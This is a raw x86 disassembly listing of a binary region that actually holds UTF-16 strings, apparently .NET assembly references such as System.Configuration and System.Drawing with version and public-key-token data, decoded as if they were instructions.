  4093e9:	add    BYTE PTR [eax],bh
  4093eb:	add    BYTE PTR [ebx+0x0],al
  4093ee:	xor    al,0x0
  4093f0:	xor    eax,0x33003400
  4093f5:	add    BYTE PTR [eax],dh
  4093f7:	add    BYTE PTR [edi],dh
  4093f9:	add    BYTE PTR [ebp+0x0],al
  4093fc:	cmp    BYTE PTR [eax],al
  4093fe:	inc    ebp
  4093ff:	add    BYTE PTR [ebx],dh
  409401:	add    BYTE PTR [ebx],dh
  409403:	add    BYTE PTR [edx+0x0],al
  409406:	cmp    BYTE PTR [eax],al
  409408:	xor    al,0x0
  40940a:	xor    al,BYTE PTR [eax]
  40940c:	add    BYTE PTR ss:[ecx],dh
  40940f:	add    BYTE PTR [eax+eax*1],dh
  409412:	xor    eax,DWORD PTR [eax]
  409414:	inc    esp
  409415:	add    BYTE PTR [ecx+0x0],al
  409418:	inc    ebp
  409419:	add    BYTE PTR [ebx+0x0],al
  40941c:	cmp    DWORD PTR [eax],eax
  40941e:	inc    esi
  40941f:	add    BYTE PTR ds:0x36003900,dh
  409425:	add    BYTE PTR [eax],bh
  409427:	add    BYTE PTR [ebx],dh
  409429:	add    BYTE PTR [esi],dh
  40942b:	add    BYTE PTR [esi+0x0],al
  40942e:	cmp    DWORD PTR [eax],eax
  409430:	aaa    
  409431:	add    BYTE PTR [ebx+0x0],al
  409434:	cmp    BYTE PTR [eax],al
  409436:	inc    esi
  409437:	add    BYTE PTR [edi],dh
  409439:	add    BYTE PTR [eax+eax*1],dh
  40943c:	aaa    
  40943d:	add    BYTE PTR ds:0x45003000,dh
  409443:	add    BYTE PTR ds:0x37003900,dh
  409449:	add    BYTE PTR ds:0x36004300,dh
  40944f:	add    BYTE PTR [eax+eax*1],dh
  409452:	inc    ebp
  409453:	add    BYTE PTR [edx],dh
  409455:	add    BYTE PTR [ecx],dh
  409457:	add    BYTE PTR [eax],bh
  409459:	add    BYTE PTR [ecx],bh
  40945b:	add    BYTE PTR [esi+0x0],al
  40945e:	xor    al,0x0
  409460:	xor    eax,0x45004400
  409465:	add    BYTE PTR [esi+0x0],al
  409468:	xor    al,0x0
  40946a:	add    BYTE PTR ss:[edx+0x0],al
  40946e:	xor    al,BYTE PTR [eax]
  409470:	inc    ecx
  409471:	add    BYTE PTR [edx],dh
  409473:	add    BYTE PTR [edx+0x0],al
  409476:	xor    DWORD PTR [eax],eax
  409478:	xor    al,BYTE PTR [eax]
  40947a:	xor    al,0x0
  40947c:	aaa    
  40947d:	add    BYTE PTR [ecx+0x0],al
  409480:	inc    esp
  409481:	add    BYTE PTR [ebx+0x0],al
  409484:	xor    eax,DWORD PTR [eax]
  409486:	add    BYTE PTR ss:0x42003200,dh
  40948d:	add    BYTE PTR [esi+0x0],al
  409490:	xor    eax,0x33004300
  409495:	add    BYTE PTR [eax],dh
  409497:	add    BYTE PTR [eax],bh
  409499:	add    BYTE PTR [eax],dh
  40949b:	add    BYTE PTR ds:0x44003500,dh
  4094a1:	add    BYTE PTR [ecx+0x0],al
  4094a4:	cmp    DWORD PTR [eax],eax
  4094a6:	adc    al,0x53
  4094a9:	add    BYTE PTR [ecx+0x0],bh
  4094ac:	jae    0x4094ae
  4094ae:	je     0x4094b0
  4094b0:	add    BYTE PTR gs:[ebp+0x0],ch
  4094b4:	add    BYTE PTR cs:[ebx+0x0],al
  4094b8:	outs   dx,DWORD PTR ds:[esi]
  4094b9:	add    BYTE PTR [ebp+0x0],ch
  4094bc:	jo     0x4094be
  4094be:	outs   dx,DWORD PTR ds:[esi]
  4094bf:	add    BYTE PTR [esi+0x0],ch
  4094c2:	add    BYTE PTR gs:[esi+0x0],ch
  4094c6:	je     0x4094c8
  4094c8:	dec    ebp
  4094c9:	add    BYTE PTR [edi+0x0],ch
  4094cc:	add    BYTE PTR fs:[ebp+0x0],ah
  4094d0:	ins    BYTE PTR es:[edi],dx
  4094d1:	add    BYTE PTR [esi],ch
  4094d3:	add    BYTE PTR [eax+eax*1+0x61],al
  4094d7:	add    BYTE PTR [eax+eax*1+0x61],dh
  4094db:	add    BYTE PTR [ecx+0x0],al
  4094de:	outs   dx,BYTE PTR ds:[esi]
  4094df:	add    BYTE PTR [esi+0x0],ch
  4094e2:	outs   dx,DWORD PTR ds:[esi]
  4094e3:	add    BYTE PTR [eax+eax*1+0x61],dh
  4094e7:	add    BYTE PTR [eax+eax*1+0x69],dh
  4094eb:	add    BYTE PTR [edi+0x0],ch
  4094ee:	outs   dx,BYTE PTR ds:[esi]
  4094ef:	add    BYTE PTR [ebx+0x0],dh
  4094f2:	sub    al,0x0
  4094f4:	and    BYTE PTR [eax],al
  4094f6:	push   esi
  4094f7:	add    BYTE PTR [ebp+0x0],ah
  4094fa:	jb     0x4094fc
  4094fc:	jae    0x4094fe
  4094fe:	imul   eax,DWORD PTR [eax],0x6e006f
  409504:	cmp    eax,0x2e003300
  409509:	add    BYTE PTR ds:0x30002e00,dh
  40950f:	add    BYTE PTR [esi],ch
  409511:	add    BYTE PTR [eax],dh
  409513:	add    BYTE PTR [eax+eax*1],ch
  409516:	and    BYTE PTR [eax],al
  409518:	inc    ebx
  409519:	add    BYTE PTR [ebp+0x0],dh
  40951c:	ins    BYTE PTR es:[edi],dx
  40951d:	add    BYTE PTR [eax+eax*1+0x75],dh
  409521:	add    BYTE PTR [edx+0x0],dh
  409524:	add    BYTE PTR gs:0x65006e00,bh
  40952b:	add    BYTE PTR [ebp+0x0],dh
  40952e:	je     0x409530
  409530:	jb     0x409532
  409532:	popa   
  409533:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409537:	add    BYTE PTR [eax],ah
  409539:	add    BYTE PTR [eax+0x0],dl
  40953c:	jne    0x40953e
  40953e:	bound  eax,QWORD PTR [eax]
  409540:	ins    BYTE PTR es:[edi],dx
  409541:	add    BYTE PTR [ecx+0x0],ch
  409544:	arpl   WORD PTR [eax],ax
  409546:	dec    ebx
  409547:	add    BYTE PTR [ebp+0x0],ah
  40954a:	jns    0x40954c
  40954c:	push   esp
  40954d:	add    BYTE PTR [edi+0x0],ch
  409550:	imul   eax,DWORD PTR [eax],0x65
  409553:	add    BYTE PTR [esi+0x0],ch
  409556:	cmp    eax,0x31003300
  40955b:	add    BYTE PTR [edx+0x0],ah
  40955e:	data16 add BYTE PTR [ebx],dh
  409561:	add    BYTE PTR [eax],bh
  409563:	add    BYTE PTR ds:0x61003600,dh
  409569:	add    BYTE PTR [eax+eax*1+0x33],ah
  40956d:	add    BYTE PTR [esi],dh
  40956f:	add    BYTE PTR [eax+eax*1],dh
  409572:	add    BYTE PTR gs:[ebx],dh
  409575:	add    BYTE PTR ds:0x53ae8000,dh
  40957b:	add    BYTE PTR [ecx+0x0],bh
  40957e:	jae    0x409580
  409580:	je     0x409582
  409582:	add    BYTE PTR gs:[ebp+0x0],ch
  409586:	add    BYTE PTR cs:[ebx+0x0],al
  40958a:	outs   dx,DWORD PTR ds:[esi]
  40958b:	add    BYTE PTR [esi+0x0],ch
  40958e:	data16 add BYTE PTR [ecx+0x0],ch
  409592:	add    BYTE PTR [di+0x0],dh
  409596:	jb     0x409598
  409598:	popa   
  409599:	add    BYTE PTR [eax+eax*1+0x69],dh
  40959d:	add    BYTE PTR [edi+0x0],ch
  4095a0:	outs   dx,BYTE PTR ds:[esi]
  4095a1:	add    BYTE PTR [eax+eax*1],ch
  4095a4:	and    BYTE PTR [eax],al
  4095a6:	push   esi
  4095a7:	add    BYTE PTR [ebp+0x0],ah
  4095aa:	jb     0x4095ac
  4095ac:	jae    0x4095ae
  4095ae:	imul   eax,DWORD PTR [eax],0x6e006f
  4095b4:	cmp    eax,0x2e003200
  4095b9:	add    BYTE PTR [eax],dh
  4095bb:	add    BYTE PTR [esi],ch
  4095bd:	add    BYTE PTR [eax],dh
  4095bf:	add    BYTE PTR [esi],ch
  4095c1:	add    BYTE PTR [eax],dh
  4095c3:	add    BYTE PTR [eax+eax*1],ch
  4095c6:	and    BYTE PTR [eax],al
  4095c8:	inc    ebx
  4095c9:	add    BYTE PTR [ebp+0x0],dh
  4095cc:	ins    BYTE PTR es:[edi],dx
  4095cd:	add    BYTE PTR [eax+eax*1+0x75],dh
  4095d1:	add    BYTE PTR [edx+0x0],dh
  4095d4:	add    BYTE PTR gs:0x65006e00,bh
  4095db:	add    BYTE PTR [ebp+0x0],dh
  4095de:	je     0x4095e0
  4095e0:	jb     0x4095e2
  4095e2:	popa   
  4095e3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4095e7:	add    BYTE PTR [eax],ah
  4095e9:	add    BYTE PTR [eax+0x0],dl
  4095ec:	jne    0x4095ee
  4095ee:	bound  eax,QWORD PTR [eax]
  4095f0:	ins    BYTE PTR es:[edi],dx
  4095f1:	add    BYTE PTR [ecx+0x0],ch
  4095f4:	arpl   WORD PTR [eax],ax
  4095f6:	dec    ebx
  4095f7:	add    BYTE PTR [ebp+0x0],ah
  4095fa:	jns    0x4095fc
  4095fc:	push   esp
  4095fd:	add    BYTE PTR [edi+0x0],ch
  409600:	imul   eax,DWORD PTR [eax],0x65
  409603:	add    BYTE PTR [esi+0x0],ch
  409606:	cmp    eax,0x30006200
  40960b:	add    BYTE PTR [ebx],dh
  40960d:	add    BYTE PTR [esi+0x0],ah
  409610:	xor    eax,0x37006600
  409615:	add    BYTE PTR [esi+0x0],ah
  409618:	xor    DWORD PTR [eax],eax
  40961a:	xor    DWORD PTR [eax],eax
  40961c:	add    BYTE PTR fs:0x61003000,dh
  409623:	add    BYTE PTR [ebx],dh
  409625:	add    BYTE PTR [ecx+0x0],ah
  409628:	cmp    BYTE PTR [esi+0x790053],0x73
  40962f:	add    BYTE PTR [eax+eax*1+0x65],dh
  409633:	add    BYTE PTR [ebp+0x0],ch
  409636:	add    BYTE PTR cs:[ebx+0x0],al
  40963a:	outs   dx,DWORD PTR ds:[esi]
  40963b:	add    BYTE PTR [esi+0x0],ch
  40963e:	data16 add BYTE PTR [ecx+0x0],ch
  409642:	add    BYTE PTR [di+0x0],dh
  409646:	jb     0x409648
  409648:	popa   
  409649:	add    BYTE PTR [eax+eax*1+0x69],dh
  40964d:	add    BYTE PTR [edi+0x0],ch
  409650:	outs   dx,BYTE PTR ds:[esi]
  409651:	add    BYTE PTR [esi],ch
  409653:	add    BYTE PTR [ecx+0x0],cl
  409656:	outs   dx,BYTE PTR ds:[esi]
  409657:	add    BYTE PTR [ebx+0x0],dh
  40965a:	je     0x40965c
  40965c:	popa   
  40965d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  409661:	add    BYTE PTR [eax+eax*1],ch
  409664:	and    BYTE PTR [eax],al
  409666:	push   esi
  409667:	add    BYTE PTR [ebp+0x0],ah
  40966a:	jb     0x40966c
  40966c:	jae    0x40966e
  40966e:	imul   eax,DWORD PTR [eax],0x6e006f
  409674:	cmp    eax,0x2e003200
  409679:	add    BYTE PTR [eax],dh
  40967b:	add    BYTE PTR [esi],ch
  40967d:	add    BYTE PTR [eax],dh
  40967f:	add    BYTE PTR [esi],ch
  409681:	add    BYTE PTR [eax],dh
  409683:	add    BYTE PTR [eax+eax*1],ch
  409686:	and    BYTE PTR [eax],al
  409688:	inc    ebx
  409689:	add    BYTE PTR [ebp+0x0],dh
  40968c:	ins    BYTE PTR es:[edi],dx
  40968d:	add    BYTE PTR [eax+eax*1+0x75],dh
  409691:	add    BYTE PTR [edx+0x0],dh
  409694:	add    BYTE PTR gs:0x65006e00,bh
  40969b:	add    BYTE PTR [ebp+0x0],dh
  40969e:	je     0x4096a0
  4096a0:	jb     0x4096a2
  4096a2:	popa   
  4096a3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4096a7:	add    BYTE PTR [eax],ah
  4096a9:	add    BYTE PTR [eax+0x0],dl
  4096ac:	jne    0x4096ae
  4096ae:	bound  eax,QWORD PTR [eax]
  4096b0:	ins    BYTE PTR es:[edi],dx
  4096b1:	add    BYTE PTR [ecx+0x0],ch
  4096b4:	arpl   WORD PTR [eax],ax
  4096b6:	dec    ebx
  4096b7:	add    BYTE PTR [ebp+0x0],ah
  4096ba:	jns    0x4096bc
  4096bc:	push   esp
  4096bd:	add    BYTE PTR [edi+0x0],ch
  4096c0:	imul   eax,DWORD PTR [eax],0x65
  4096c3:	add    BYTE PTR [esi+0x0],ch
  4096c6:	cmp    eax,0x30006200
  4096cb:	add    BYTE PTR [ebx],dh
  4096cd:	add    BYTE PTR [esi+0x0],ah
  4096d0:	xor    eax,0x37006600
  4096d5:	add    BYTE PTR [esi+0x0],ah
  4096d8:	xor    DWORD PTR [eax],eax
  4096da:	xor    DWORD PTR [eax],eax
  4096dc:	add    BYTE PTR fs:0x61003000,dh
  4096e3:	add    BYTE PTR [ebx],dh
  4096e5:	add    BYTE PTR [ecx+0x0],ah
  4096e8:	sub    BYTE PTR [eax+0x790053],0x73
  4096ef:	add    BYTE PTR [eax+eax*1+0x65],dh
  4096f3:	add    BYTE PTR [ebp+0x0],ch
  4096f6:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4096fb:	add    BYTE PTR [eax+0x0],dh
  4096fe:	ins    BYTE PTR es:[edi],dx
  4096ff:	add    BYTE PTR [edi+0x0],ch
  409702:	jns    0x409704
  409704:	ins    DWORD PTR es:[edi],dx
  409705:	add    BYTE PTR [ebp+0x0],ah
  409708:	outs   dx,BYTE PTR ds:[esi]
  409709:	add    BYTE PTR [eax+eax*1+0x2c],dh
  40970d:	add    BYTE PTR [eax],ah
  40970f:	add    BYTE PTR [esi+0x0],dl
  409712:	add    BYTE PTR gs:[edx+0x0],dh
  409716:	jae    0x409718
  409718:	imul   eax,DWORD PTR [eax],0x6e006f
  40971e:	cmp    eax,0x2e003200
  409723:	add    BYTE PTR [eax],dh
  409725:	add    BYTE PTR [esi],ch
  409727:	add    BYTE PTR [eax],dh
  409729:	add    BYTE PTR [esi],ch
  40972b:	add    BYTE PTR [eax],dh
  40972d:	add    BYTE PTR [eax+eax*1],ch
  409730:	and    BYTE PTR [eax],al
  409732:	inc    ebx
  409733:	add    BYTE PTR [ebp+0x0],dh
  409736:	ins    BYTE PTR es:[edi],dx
  409737:	add    BYTE PTR [eax+eax*1+0x75],dh
  40973b:	add    BYTE PTR [edx+0x0],dh
  40973e:	add    BYTE PTR gs:0x65006e00,bh
  409745:	add    BYTE PTR [ebp+0x0],dh
  409748:	je     0x40974a
  40974a:	jb     0x40974c
  40974c:	popa   
  40974d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409751:	add    BYTE PTR [eax],ah
  409753:	add    BYTE PTR [eax+0x0],dl
  409756:	jne    0x409758
  409758:	bound  eax,QWORD PTR [eax]
  40975a:	ins    BYTE PTR es:[edi],dx
  40975b:	add    BYTE PTR [ecx+0x0],ch
  40975e:	arpl   WORD PTR [eax],ax
  409760:	dec    ebx
  409761:	add    BYTE PTR [ebp+0x0],ah
  409764:	jns    0x409766
  409766:	push   esp
  409767:	add    BYTE PTR [edi+0x0],ch
  40976a:	imul   eax,DWORD PTR [eax],0x65
  40976d:	add    BYTE PTR [esi+0x0],ch
  409770:	cmp    eax,0x30006200
  409775:	add    BYTE PTR [ebx],dh
  409777:	add    BYTE PTR [esi+0x0],ah
  40977a:	xor    eax,0x37006600
  40977f:	add    BYTE PTR [esi+0x0],ah
  409782:	xor    DWORD PTR [eax],eax
  409784:	xor    DWORD PTR [eax],eax
  409786:	add    BYTE PTR fs:0x61003000,dh
  40978d:	add    BYTE PTR [ebx],dh
  40978f:	add    BYTE PTR [ecx+0x0],ah
  409792:	and    BYTE PTR [eax+0x790053],0x73
  409799:	add    BYTE PTR [eax+eax*1+0x65],dh
  40979d:	add    BYTE PTR [ebp+0x0],ch
  4097a0:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  4097a5:	add    BYTE PTR [ebx+0x0],dh
  4097a8:	imul   eax,DWORD PTR [eax],0x6e0067
  4097ae:	sub    al,0x0
  4097b0:	and    BYTE PTR [eax],al
  4097b2:	push   esi
  4097b3:	add    BYTE PTR [ebp+0x0],ah
  4097b6:	jb     0x4097b8
  4097b8:	jae    0x4097ba
  4097ba:	imul   eax,DWORD PTR [eax],0x6e006f
  4097c0:	cmp    eax,0x2e003200
  4097c5:	add    BYTE PTR [eax],dh
  4097c7:	add    BYTE PTR [esi],ch
  4097c9:	add    BYTE PTR [eax],dh
  4097cb:	add    BYTE PTR [esi],ch
  4097cd:	add    BYTE PTR [eax],dh
  4097cf:	add    BYTE PTR [eax+eax*1],ch
  4097d2:	and    BYTE PTR [eax],al
  4097d4:	inc    ebx
  4097d5:	add    BYTE PTR [ebp+0x0],dh
  4097d8:	ins    BYTE PTR es:[edi],dx
  4097d9:	add    BYTE PTR [eax+eax*1+0x75],dh
  4097dd:	add    BYTE PTR [edx+0x0],dh
  4097e0:	add    BYTE PTR gs:0x65006e00,bh
  4097e7:	add    BYTE PTR [ebp+0x0],dh
  4097ea:	je     0x4097ec
  4097ec:	jb     0x4097ee
  4097ee:	popa   
  4097ef:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4097f3:	add    BYTE PTR [eax],ah
  4097f5:	add    BYTE PTR [eax+0x0],dl
  4097f8:	jne    0x4097fa
  4097fa:	bound  eax,QWORD PTR [eax]
  4097fc:	ins    BYTE PTR es:[edi],dx
  4097fd:	add    BYTE PTR [ecx+0x0],ch
  409800:	arpl   WORD PTR [eax],ax
  409802:	dec    ebx
  409803:	add    BYTE PTR [ebp+0x0],ah
  409806:	jns    0x409808
  409808:	push   esp
  409809:	add    BYTE PTR [edi+0x0],ch
  40980c:	imul   eax,DWORD PTR [eax],0x65
  40980f:	add    BYTE PTR [esi+0x0],ch
  409812:	cmp    eax,0x30006200
  409817:	add    BYTE PTR [ebx],dh
  409819:	add    BYTE PTR [esi+0x0],ah
  40981c:	xor    eax,0x37006600
  409821:	add    BYTE PTR [esi+0x0],ah
  409824:	xor    DWORD PTR [eax],eax
  409826:	xor    DWORD PTR [eax],eax
  409828:	add    BYTE PTR fs:0x61003000,dh
  40982f:	add    BYTE PTR [ebx],dh
  409831:	add    BYTE PTR [ecx+0x0],ah
  409834:	xor    BYTE PTR [esi+0x790053],0x73
  40983b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40983f:	add    BYTE PTR [ebp+0x0],ch
  409842:	add    BYTE PTR cs:[eax+eax*1+0x69],al
  409847:	add    BYTE PTR [edx+0x0],dh
  40984a:	add    BYTE PTR gs:[ebx+0x0],ah
  40984e:	je     0x409850
  409850:	outs   dx,DWORD PTR ds:[esi]
  409851:	add    BYTE PTR [edx+0x0],dh
  409854:	jns    0x409856
  409856:	push   ebx
  409857:	add    BYTE PTR [ebp+0x0],ah
  40985a:	jb     0x40985c
  40985c:	jbe    0x40985e
  40985e:	imul   eax,DWORD PTR [eax],0x650063
  409864:	jae    0x409866
  409866:	sub    al,0x0
  409868:	and    BYTE PTR [eax],al
  40986a:	push   esi
  40986b:	add    BYTE PTR [ebp+0x0],ah
  40986e:	jb     0x409870
  409870:	jae    0x409872
  409872:	imul   eax,DWORD PTR [eax],0x6e006f
  409878:	cmp    eax,0x2e003200
  40987d:	add    BYTE PTR [eax],dh
  40987f:	add    BYTE PTR [esi],ch
  409881:	add    BYTE PTR [eax],dh
  409883:	add    BYTE PTR [esi],ch
  409885:	add    BYTE PTR [eax],dh
  409887:	add    BYTE PTR [eax+eax*1],ch
  40988a:	and    BYTE PTR [eax],al
  40988c:	inc    ebx
  40988d:	add    BYTE PTR [ebp+0x0],dh
  409890:	ins    BYTE PTR es:[edi],dx
  409891:	add    BYTE PTR [eax+eax*1+0x75],dh
  409895:	add    BYTE PTR [edx+0x0],dh
  409898:	add    BYTE PTR gs:0x65006e00,bh
  40989f:	add    BYTE PTR [ebp+0x0],dh
  4098a2:	je     0x4098a4
  4098a4:	jb     0x4098a6
  4098a6:	popa   
  4098a7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4098ab:	add    BYTE PTR [eax],ah
  4098ad:	add    BYTE PTR [eax+0x0],dl
  4098b0:	jne    0x4098b2
  4098b2:	bound  eax,QWORD PTR [eax]
  4098b4:	ins    BYTE PTR es:[edi],dx
  4098b5:	add    BYTE PTR [ecx+0x0],ch
  4098b8:	arpl   WORD PTR [eax],ax
  4098ba:	dec    ebx
  4098bb:	add    BYTE PTR [ebp+0x0],ah
  4098be:	jns    0x4098c0
  4098c0:	push   esp
  4098c1:	add    BYTE PTR [edi+0x0],ch
  4098c4:	imul   eax,DWORD PTR [eax],0x65
  4098c7:	add    BYTE PTR [esi+0x0],ch
  4098ca:	cmp    eax,0x30006200
  4098cf:	add    BYTE PTR [ebx],dh
  4098d1:	add    BYTE PTR [esi+0x0],ah
  4098d4:	xor    eax,0x37006600
  4098d9:	add    BYTE PTR [esi+0x0],ah
  4098dc:	xor    DWORD PTR [eax],eax
  4098de:	xor    DWORD PTR [eax],eax
  4098e0:	add    BYTE PTR fs:0x61003000,dh
  4098e7:	add    BYTE PTR [ebx],dh
  4098e9:	add    BYTE PTR [ecx+0x0],ah
  4098ec:	xor    BYTE PTR [eax+0x790053],0x73
  4098f3:	add    BYTE PTR [eax+eax*1+0x65],dh
  4098f7:	add    BYTE PTR [ebp+0x0],ch
  4098fa:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  4098ff:	add    BYTE PTR [ecx+0x0],ah
  409902:	ja     0x409904
  409904:	imul   eax,DWORD PTR [eax],0x67006e
  40990a:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40990f:	add    BYTE PTR [ebx+0x0],dh
  409912:	imul   eax,DWORD PTR [eax],0x6e0067
  409918:	sub    al,0x0
  40991a:	and    BYTE PTR [eax],al
  40991c:	push   esi
  40991d:	add    BYTE PTR [ebp+0x0],ah
  409920:	jb     0x409922
  409922:	jae    0x409924
  409924:	imul   eax,DWORD PTR [eax],0x6e006f
  40992a:	cmp    eax,0x2e003200
  40992f:	add    BYTE PTR [eax],dh
  409931:	add    BYTE PTR [esi],ch
  409933:	add    BYTE PTR [eax],dh
  409935:	add    BYTE PTR [esi],ch
  409937:	add    BYTE PTR [eax],dh
  409939:	add    BYTE PTR [eax+eax*1],ch
  40993c:	and    BYTE PTR [eax],al
  40993e:	inc    ebx
  40993f:	add    BYTE PTR [ebp+0x0],dh
  409942:	ins    BYTE PTR es:[edi],dx
  409943:	add    BYTE PTR [eax+eax*1+0x75],dh
  409947:	add    BYTE PTR [edx+0x0],dh
  40994a:	add    BYTE PTR gs:0x65006e00,bh
  409951:	add    BYTE PTR [ebp+0x0],dh
  409954:	je     0x409956
  409956:	jb     0x409958
  409958:	popa   
  409959:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40995d:	add    BYTE PTR [eax],ah
  40995f:	add    BYTE PTR [eax+0x0],dl
  409962:	jne    0x409964
  409964:	bound  eax,QWORD PTR [eax]
  409966:	ins    BYTE PTR es:[edi],dx
  409967:	add    BYTE PTR [ecx+0x0],ch
  40996a:	arpl   WORD PTR [eax],ax
  40996c:	dec    ebx
  40996d:	add    BYTE PTR [ebp+0x0],ah
  409970:	jns    0x409972
  409972:	push   esp
  409973:	add    BYTE PTR [edi+0x0],ch
  409976:	imul   eax,DWORD PTR [eax],0x65
  409979:	add    BYTE PTR [esi+0x0],ch
  40997c:	cmp    eax,0x30006200
  409981:	add    BYTE PTR [ebx],dh
  409983:	add    BYTE PTR [esi+0x0],ah
  409986:	xor    eax,0x37006600
  40998b:	add    BYTE PTR [esi+0x0],ah
  40998e:	xor    DWORD PTR [eax],eax
  409990:	xor    DWORD PTR [eax],eax
  409992:	add    BYTE PTR fs:0x61003000,dh
  409999:	add    BYTE PTR [ebx],dh
  40999b:	add    BYTE PTR [ecx+0x0],ah
  40999e:	and    BYTE PTR [edx+0x790053],0x73
  4099a5:	add    BYTE PTR [eax+eax*1+0x65],dh
  4099a9:	add    BYTE PTR [ebp+0x0],ch
  4099ac:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  4099b1:	add    BYTE PTR [ecx+0x0],ah
  4099b4:	ja     0x4099b6
  4099b6:	imul   eax,DWORD PTR [eax],0x67006e
  4099bc:	sub    al,0x0
  4099be:	and    BYTE PTR [eax],al
  4099c0:	push   esi
  4099c1:	add    BYTE PTR [ebp+0x0],ah
  4099c4:	jb     0x4099c6
  4099c6:	jae    0x4099c8
  4099c8:	imul   eax,DWORD PTR [eax],0x6e006f
  4099ce:	cmp    eax,0x2e003200
  4099d3:	add    BYTE PTR [eax],dh
  4099d5:	add    BYTE PTR [esi],ch
  4099d7:	add    BYTE PTR [eax],dh
  4099d9:	add    BYTE PTR [esi],ch
  4099db:	add    BYTE PTR [eax],dh
  4099dd:	add    BYTE PTR [eax+eax*1],ch
  4099e0:	and    BYTE PTR [eax],al
  4099e2:	inc    ebx
  4099e3:	add    BYTE PTR [ebp+0x0],dh
  4099e6:	ins    BYTE PTR es:[edi],dx
  4099e7:	add    BYTE PTR [eax+eax*1+0x75],dh
  4099eb:	add    BYTE PTR [edx+0x0],dh
  4099ee:	add    BYTE PTR gs:0x65006e00,bh
  4099f5:	add    BYTE PTR [ebp+0x0],dh
  4099f8:	je     0x4099fa
  4099fa:	jb     0x4099fc
  4099fc:	popa   
  4099fd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409a01:	add    BYTE PTR [eax],ah
  409a03:	add    BYTE PTR [eax+0x0],dl
  409a06:	jne    0x409a08
  409a08:	bound  eax,QWORD PTR [eax]
  409a0a:	ins    BYTE PTR es:[edi],dx
  409a0b:	add    BYTE PTR [ecx+0x0],ch
  409a0e:	arpl   WORD PTR [eax],ax
  409a10:	dec    ebx
  409a11:	add    BYTE PTR [ebp+0x0],ah
  409a14:	jns    0x409a16
  409a16:	push   esp
  409a17:	add    BYTE PTR [edi+0x0],ch
  409a1a:	imul   eax,DWORD PTR [eax],0x65
  409a1d:	add    BYTE PTR [esi+0x0],ch
  409a20:	cmp    eax,0x30006200
  409a25:	add    BYTE PTR [ebx],dh
  409a27:	add    BYTE PTR [esi+0x0],ah
  409a2a:	xor    eax,0x37006600
  409a2f:	add    BYTE PTR [esi+0x0],ah
  409a32:	xor    DWORD PTR [eax],eax
  409a34:	xor    DWORD PTR [eax],eax
  409a36:	add    BYTE PTR fs:0x61003000,dh
  409a3d:	add    BYTE PTR [ebx],dh
  409a3f:	add    BYTE PTR [ecx+0x0],ah
  409a42:	cmp    BYTE PTR [eax+0x790053],0x73
  409a49:	add    BYTE PTR [eax+eax*1+0x65],dh
  409a4d:	add    BYTE PTR [ebp+0x0],ch
  409a50:	add    BYTE PTR cs:[ebp+0x0],al
  409a54:	outs   dx,BYTE PTR ds:[esi]
  409a55:	add    BYTE PTR [eax+eax*1+0x65],dh
  409a59:	add    BYTE PTR [edx+0x0],dh
  409a5c:	jo     0x409a5e
  409a5e:	jb     0x409a60
  409a60:	imul   eax,DWORD PTR [eax],0x650073
  409a66:	push   ebx
  409a67:	add    BYTE PTR [ebp+0x0],ah
  409a6a:	jb     0x409a6c
  409a6c:	jbe    0x409a6e
  409a6e:	imul   eax,DWORD PTR [eax],0x650063
  409a74:	jae    0x409a76
  409a76:	sub    al,0x0
  409a78:	and    BYTE PTR [eax],al
  409a7a:	push   esi
  409a7b:	add    BYTE PTR [ebp+0x0],ah
  409a7e:	jb     0x409a80
  409a80:	jae    0x409a82
  409a82:	imul   eax,DWORD PTR [eax],0x6e006f
  409a88:	cmp    eax,0x2e003200
  409a8d:	add    BYTE PTR [eax],dh
  409a8f:	add    BYTE PTR [esi],ch
  409a91:	add    BYTE PTR [eax],dh
  409a93:	add    BYTE PTR [esi],ch
  409a95:	add    BYTE PTR [eax],dh
  409a97:	add    BYTE PTR [eax+eax*1],ch
  409a9a:	and    BYTE PTR [eax],al
  409a9c:	inc    ebx
  409a9d:	add    BYTE PTR [ebp+0x0],dh
  409aa0:	ins    BYTE PTR es:[edi],dx
  409aa1:	add    BYTE PTR [eax+eax*1+0x75],dh
  409aa5:	add    BYTE PTR [edx+0x0],dh
  409aa8:	add    BYTE PTR gs:0x65006e00,bh
  409aaf:	add    BYTE PTR [ebp+0x0],dh
  409ab2:	je     0x409ab4
  409ab4:	jb     0x409ab6
  409ab6:	popa   
  409ab7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409abb:	add    BYTE PTR [eax],ah
  409abd:	add    BYTE PTR [eax+0x0],dl
  409ac0:	jne    0x409ac2
  409ac2:	bound  eax,QWORD PTR [eax]
  409ac4:	ins    BYTE PTR es:[edi],dx
  409ac5:	add    BYTE PTR [ecx+0x0],ch
  409ac8:	arpl   WORD PTR [eax],ax
  409aca:	dec    ebx
  409acb:	add    BYTE PTR [ebp+0x0],ah
  409ace:	jns    0x409ad0
  409ad0:	push   esp
  409ad1:	add    BYTE PTR [edi+0x0],ch
  409ad4:	imul   eax,DWORD PTR [eax],0x65
  409ad7:	add    BYTE PTR [esi+0x0],ch
  409ada:	cmp    eax,0x30006200
  409adf:	add    BYTE PTR [ebx],dh
  409ae1:	add    BYTE PTR [esi+0x0],ah
  409ae4:	xor    eax,0x37006600
  409ae9:	add    BYTE PTR [esi+0x0],ah
  409aec:	xor    DWORD PTR [eax],eax
  409aee:	xor    DWORD PTR [eax],eax
  409af0:	add    BYTE PTR fs:0x61003000,dh
  409af7:	add    BYTE PTR [ebx],dh
  409af9:	add    BYTE PTR [ecx+0x0],ah
  409afc:	sub    BYTE PTR [eax+0x790053],0x73
  409b03:	add    BYTE PTR [eax+eax*1+0x65],dh
  409b07:	add    BYTE PTR [ebp+0x0],ch
  409b0a:	add    BYTE PTR cs:[ebp+0x0],cl
  409b0e:	popa   
  409b0f:	add    BYTE PTR [esi+0x0],ch
  409b12:	popa   
  409b13:	add    BYTE PTR [edi+0x0],ah
